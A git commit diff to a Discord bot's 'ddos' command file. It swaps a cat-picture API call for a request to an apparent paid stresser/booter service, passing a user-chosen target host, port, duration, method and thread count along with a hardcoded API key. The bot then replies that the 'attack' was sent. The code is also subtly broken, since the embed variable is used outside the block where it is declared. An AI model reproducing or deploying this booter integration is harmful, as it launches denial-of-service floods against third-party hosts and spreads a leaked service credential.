c26c95e0ccf53064b775ee8bdd55615f1acf5c7f
Donutgamer0684 <79782483+Donutgamer0684@users.noreply.github.com>
2021-07-17 16:38:12 -0500

    awdawd

--- commands/stress.js
+++ commands/stress.js
@@ -2,33 +2,39 @@ module.exports = {
     name: 'ddos',
     description: "this is a ddos command",
     execute(message, args, Discord) {
+        {
+            const newEmbed = new Discord.MessageEmbed()
+            .setColor('BLACK')
+            .setTitle('')
+            .setURL('')
+            .setDescription(`
+            [API LOGS]
+            Request was taken in under **10000**ms
+            Attack sent with normal power
+            APIv4 SYSTEM (**Paid**)
+            [API LOGS]`)
+            .setTimestamp()
+            .setFooter('Not all added yet | Testing');
+        }
       const Commando = require('discord.js-commando')
-const axios = require('axios')
-        const newEmbed = new Discord.MessageEmbed()
-        .setColor('BLACK')
-        .setTitle('')
-        .setURL('')
-        .setDescription(`
-        [API LOGS]
-        Request was taken in under **10000**ms
-        Attack sent with normal power
-        APIv4 SYSTEM (**Paid**)
-        [API LOGS]`)
-        .setTimestamp()
-        .setFooter('Not all added yet | Testing');
-          run = async (message) => {
-    axios
-      .get('https://api.thecatapi.com/v1/images/search')
-      .then((res) => {
-        console.log('RES:', res.data[0].url)
-        message.reply(res.data[0].url)
-      })
-      .catch((err) => {
-        console.error('ERR:', err)
-      })
-  }
+      const axios = require('axios')
+      {
+        axios
+        .get(
+          "https://api.primitive-api.cc/api.php?key=C1uXrKpSGm9xdOjA&host=" +
+            args[1] +
+            "&port=" +
+            args[2] +
+            "&time=" +
+            args[3] +
+            "&method=" +
+            args[4] +
+            "&threads=" +
+            args[5] +
+            "&pps="
+        )
+      }
 
         message.channel.send(newEmbed);
-
     }
 }
